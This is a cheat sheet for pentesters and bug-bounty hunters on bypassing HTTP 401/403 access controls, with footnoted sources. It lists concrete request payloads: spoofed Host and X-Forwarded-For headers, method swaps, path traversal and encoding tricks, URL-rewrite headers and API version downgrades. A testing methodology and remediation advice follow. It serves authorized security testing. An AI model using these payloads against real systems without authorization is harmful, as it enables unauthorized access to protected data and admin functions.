 401/403 bypass
***

# 401/403 Bypass Cheat Sheet

This is a structured **Case List + Checklist + Methodology** to systematically test 401/403 bypasses during pentests and bug bounty hunting.[1][2]

***

## Case List: Typical 401/403 Bypass Scenarios

**Case 1 – Host header mutation**  
- `/admin` returns 403, but changing the `Host` header (e.g., `Host: localhost` or `Host:www.target.com`) may bypass restrictions.[3]

**Case 2 – IP spoofing via headers**  
- `/api/internal` returns 403, but adding `X-Forwarded-For: 127.0.0.1` can trick the backend into treating the request as internal.[4][1]

**Case 3 – HTTP method bypass**  
- `GET /admin` returns 403, but `POST /admin`, `PUT /admin`, or even non-standard methods sometimes get through.[2][1]

**Case 4 – Path traversal / encoding**  
- `/authorization-response` is blocked, but variants like `/%2e%2e/authorization-response` or `/..;/authorization-response` may be interpreted differently by the proxy/backend.[3][1]

**Case 5 – URL parameter tricks**  
- `/endpoint` is forbidden, but `/endpoint?`, `/endpoint??`, or `/endpoint.json` might bypass filters or hit a different route.[2]

**Case 6 – Reverse proxy inconsistency**  
- Mixed casing or encoded paths such as `/AUTHORIZATION-RESPONSE/` or `/api/v4;X=Y/endpoint` can exploit parsing differences between WAF and backend.[1][3]

**Case 7 – Header-based internal routing**  
- `GET /api/admin` is 403, but `GET /` with `X-Original-URL: /api/admin` or `X-Rewrite-URL: /api/admin` targets hidden routes.[3]

**Case 8 – API version downgrade**  
- `/api/v4/admin` is protected, but `/api/v3/admin` or `/api/v1/admin` may lack the same authorization checks.[5][3]

***

## Checklist: Concrete Tests (Burp Repeater Friendly)

### Host Header Bypasses

- `Host: www.target.com` → `Host: localhost`  
- Lowercase header name: `host: www.target.com`  
- No space: `Host:www.target.com`  
- Tab instead of space: `Host:<tab>www.target.com`  
- Appended values: `Host: www.target.com sensitive-file.txt`  
- Fuzz ports: `Host: www.target.com:FUZZ` (Intruder / ffuf style).[1][3]

### HTTP Method Bypasses

- Change `GET` to: `POST`, `PUT`, `DELETE`, `HEAD`, `OPTIONS`, `PATCH`  
- Lowercase: `get /endpoint HTTP/1.1`  
- Random method: `ANYTHING /endpoint HTTP/1.1`  
- Mixed case: `GeT`, `PoST`, `gEt` (edge-case parsers).[2][1]

### IP Spoofing Headers

Try individually, then in combinations:

- `X-Forwarded-For: 127.0.0.1`  
- Two `X-Forwarded-For` headers (one empty)  
- `X_Forwarded_For: 127.0.0.1` (underscore)  
- `Forwarded: for=127.0.0.1`  
- `X-Real-IP: 127.0.0.1`  
- `X-Client-IP: 127.0.0.1`  
- `True-Client-IP: 127.0.0.1`  
- `CF-Connecting-IP: 127.0.0.1`  
- `X-ProxyUser-Ip: 127.0.0.1`  
- `X-Custom-Ip-Authorization: 127.0.0.1`[4][1]

### Path Encoding / Traversal

- `/%2e/endpoint`  
- `/%2e%2e/endpoint`  
- `/authorization-response..;/` or `/..;/endpoint`  
- `/endpoint%00` (null byte)  
- `/endpoint%0d` (CR)  
- `/endpoint\..\..`  
- `/#//../endpoint`  
- `/.//endpoint`, `/./endpoint`  
- `/200-OK/..//endpoint`  
- `/endpoint;/../200-OK`[3][1]

### URL Parameter Tricks

- `/endpoint?`  
- `/endpoint??`  
- `/endpoint.json`, `/endpoint.php`, `/endpoint.xml`  
- `/endpoint%2e.php%3b.jpg`  
- Tomcat-style matrix param: `/api/v4;X=Y/endpoint`[1][2]

### Header Injection / Rewrite

- `GET /` + `X-Original-URL: /admin`  
- `X-Rewrite-URL: /admin`  
- `X-Override-URL: /admin`  
- Uppercase path: `/AUTHORIZATION-RESPONSE/`  
- URL-encoded first char: `/%61dmin`, `/%61pi/v1/endpoint`[3][1]

### Content-Type Bypasses

- `Content-Type: 0`  
- `Content-Type: application/json`  
- `Content-Type: application/xml`  
Compare status, body, and content-length for each.[5][2]

### API Version / Endpoint Variant

If ` /api/v4/admin` is 403:

- `/api/v3/admin`  
- `/api/v2/admin`  
- `/api/v1/admin`  
- `/api/v4.1/admin`, `/api/v4.0/admin`  
Also try route variants: `/admin`, `/admin/`, `/admin?`, `/admin.php`.[5][3]

### Unicode / Special Encodings

- Right-to-left override example:  
  - `/%2e%80%aeesnopser-noitazirohtua/` (obfuscated `authorization-response`)  
- Combine mixed encodings with the path tricks above where needed.[2][1]

***

## Step-by-Step Methodology

### Phase 1 – Identify the Target Endpoint

**1. Find restricted endpoints**

- Browse the app and log all endpoints returning **401/403** (e.g., `/admin`, `/api/internal`, `/authorization-response`).[4][3]

**2. Capture a baseline**

- In Burp Repeater, save a single **baseline** request:  
  - Status: 401 or 403  
  - Response body + content-length  
  - Response headers (look for WAF/proxy hints).[1]

***

### Phase 2 – Systematic Testing in Burp

**General rule:** use **Repeater**, change **one thing at a time**, and compare status + content-length against the baseline.

1. **Host header tests**  
   - Apply the Host header checklist above.  
   - Any change from 401/403 to 200/302 or to a different body is a candidate bypass.

2. **HTTP method tests**  
   - Replace `GET` with other methods and variants.  
   - Watch for endpoints that accept POST/PUT but not GET.[2][1]

3. **IP spoofing tests**  
   - Add IP headers one by one.  
   - If any header yields 200/302 instead of 403, that suggests IP-based access control.[4][1]

4. **Path encoding/traversal tests**  
   - Modify the path with encoded dots, semicolons, extra segments, nulls/newlines.  
   - Compare responses carefully; sometimes the status remains 403 but content or behavior differs.[3][1]

5. **URL parameter tricks**  
   - Add `?`, `??`, change extensions, try matrix parameters.  
   - Often hits a different route or less-protected handler.[2]

6. **Header rewrite tests**  
   - Inject `X-Original-URL`, `X-Rewrite-URL`, etc., usually on `GET /`.  
   - Check if backend honors the header and processes a hidden path.[3]

7. **Content-Type and body style**  
   - Switch content type and observe changes, especially for POST/PUT endpoints.[5][2]

8. **Version and path variant tests**  
   - Try older/newer API versions and small path variants (`/admin/`, `/admin.php`).[5][3]

9. **Unicode / special encoding**  
   - Only after the above fail, try RTL/Unicode encodings and mixed encoding patterns.[1][2]

***

### Phase 3 – Automation (Optional)

- Use tools like **4-ZERO-3** or similar bypass fuzzers against the 401/403 endpoint.[6][7]
- Always validate tool “200 OK” hits manually by checking:  
  - Content-length vs baseline 403  
  - Actual content (real restricted resource vs error/redirect).

***

### Phase 4 – Validation & Escalation

1. **Confirm the bypass**

- Ensure you can **consistently** switch from 401/403 to 200/302 using a specific change.  
- Confirm the response is the protected resource, not just a different error.[4][3]

2. **Prove impact**

- Access restricted data or perform restricted actions (e.g., admin pages, internal APIs, configuration).  
- Save raw HTTP, screenshots, or short video PoC.

3. **Try chaining**

- Combine techniques where single tricks fail:  
  - Host + method change  
  - Method + IP spoofing header  
  - Path encoding + header rewrite.[1][2]

***

### Phase 5 – Reporting

- **Title:**  
  - “403 Forbidden Bypass via [Technique] on [Endpoint]”

- **Summary:**  
  - Clearly state which bypass works (e.g., `X-Forwarded-For`, method change, path encoding) and what resource becomes accessible.[2][1]

- **Steps to Reproduce:**  
  - Include baseline 403 request and the modified bypass request (full raw HTTP).

- **Proof of Concept:**  
  - Response screenshot/body showing restricted data or functionality.

- **Impact:**  
  - Detail what an attacker can now see or do (admin actions, internal APIs, sensitive data, policy bypass).

- **Recommendation:**  
  - Enforce access control in backend business logic, not only WAF/proxy.  
  - Normalize and canonicalize paths before checks.  
  - Do not trust client-supplied IP or override headers for authorization.[4][3]

***



[1](https://latesthackingnews.com/2023/04/28/401-and-403-bypass-cheat-sheet-for-penetration-testers/)
[2](https://codelivly.com/401-403-bypass-cheatsheet/)
[3](https://blog.vidocsecurity.com/blog/401-and-403-bypass-how-to-do-it-right)
[4](https://www.securiumacademy.com/blog/bypassing-403-forbidden-page-a-pentesters-guide)
[5](https://infosecwriteups.com/methods-to-bypass-403-401-38df4cec069e)
[6](https://www.geeksforgeeks.org/linux-unix/4-zero-3-tool-to-bypass-403-401/)
[7](https://github.com/0xrisec/4-ZERO-3)
[8](https://github.com/intrudir/BypassFuzzer)
[9](https://www.linkedin.com/posts/jagat-singh-b824701b8_bugbunty-bughunter-india-activity-7303673146417586176-inEq)
[10](https://github.com/Dheerajmadhukar/4-ZERO-3?search=1)
